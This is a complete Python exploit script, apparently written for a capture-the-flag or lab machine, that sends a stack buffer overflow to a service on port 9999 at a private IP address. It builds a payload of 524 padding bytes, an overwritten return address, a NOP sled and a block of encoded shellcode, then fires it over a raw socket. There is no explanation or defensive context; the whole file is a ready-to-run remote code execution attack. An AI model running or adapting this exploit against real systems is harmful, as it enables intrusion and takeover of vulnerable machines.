import socket, time, sys
ip = '10.10.231.81'
port = 9999
offset = 524

shellcode = (
b"\xba\xc0\xa8\xd4\xad\xda\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
b"\x52\x83\xc6\x04\x31\x56\x0e\x03\x96\xa6\x36\x58\xea\x5f\x34"
b"\xa3\x12\xa0\x59\x2d\xf7\x91\x59\x49\x7c\x81\x69\x19\xd0\x2e"
b"\x01\x4f\xc0\xa5\x67\x58\xe7\x0e\xcd\xbe\xc6\x8f\x7e\x82\x49"
b"\x0c\x7d\xd7\xa9\x2d\x4e\x2a\xa8\x6a\xb3\xc7\xf8\x23\xbf\x7a"
b"\xec\x40\xf5\x46\x87\x1b\x1b\xcf\x74\xeb\x1a\xfe\x2b\x67\x45"
b"\x20\xca\xa4\xfd\x69\xd4\xa9\x38\x23\x6f\x19\xb6\xb2\xb9\x53"
b"\x37\x18\x84\x5b\xca\x60\xc1\x5c\x35\x17\x3b\x9f\xc8\x20\xf8"
b"\xdd\x16\xa4\x1a\x45\xdc\x1e\xc6\x77\x31\xf8\x8d\x74\xfe\x8e"
b"\xc9\x98\x01\x42\x62\xa4\x8a\x65\xa4\x2c\xc8\x41\x60\x74\x8a"
b"\xe8\x31\xd0\x7d\x14\x21\xbb\x22\xb0\x2a\x56\x36\xc9\x71\x3f"
b"\xfb\xe0\x89\xbf\x93\x73\xfa\x8d\x3c\x28\x94\xbd\xb5\xf6\x63"
b"\xc1\xef\x4f\xfb\x3c\x10\xb0\xd2\xfa\x44\xe0\x4c\x2a\xe5\x6b"
b"\x8c\xd3\x30\x3b\xdc\x7b\xeb\xfc\x8c\x3b\x5b\x95\xc6\xb3\x84"
b"\x85\xe9\x19\xad\x2c\x10\xca\xd8\xa1\x1b\x7e\xb5\xc3\x1b\x6f"
b"\x19\x4d\xfd\xe5\xb1\x1b\x56\x92\x28\x06\x2c\x03\xb4\x9c\x49"
b"\x03\x3e\x13\xae\xca\xb7\x5e\xbc\xbb\x37\x15\x9e\x6a\x47\x83"
b"\xb6\xf1\xda\x48\x46\x7f\xc7\xc6\x11\x28\x39\x1f\xf7\xc4\x60"
b"\x89\xe5\x14\xf4\xf2\xad\xc2\xc5\xfd\x2c\x86\x72\xda\x3e\x5e"
b"\x7a\x66\x6a\x0e\x2d\x30\xc4\xe8\x87\xf2\xbe\xa2\x74\x5d\x56"
b"\x32\xb7\x5e\x20\x3b\x92\x28\xcc\x8a\x4b\x6d\xf3\x23\x1c\x79"
b"\x8c\x59\xbc\x86\x47\xda\xdc\x64\x4d\x17\x75\x31\x04\x9a\x18"
b"\xc2\xf3\xd9\x24\x41\xf1\xa1\xd2\x59\x70\xa7\x9f\xdd\x69\xd5"
b"\xb0\x8b\x8d\x4a\xb0\x99"
)

buffer = b"A" * offset + b"\xf3\x12\x17\x31" + b"\x90" * 32 + shellcode

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((ip, port))
    s.send((buffer + b'\r\n'))
    s.close()
    print("Done")
except:
    print("Cannot connect to client")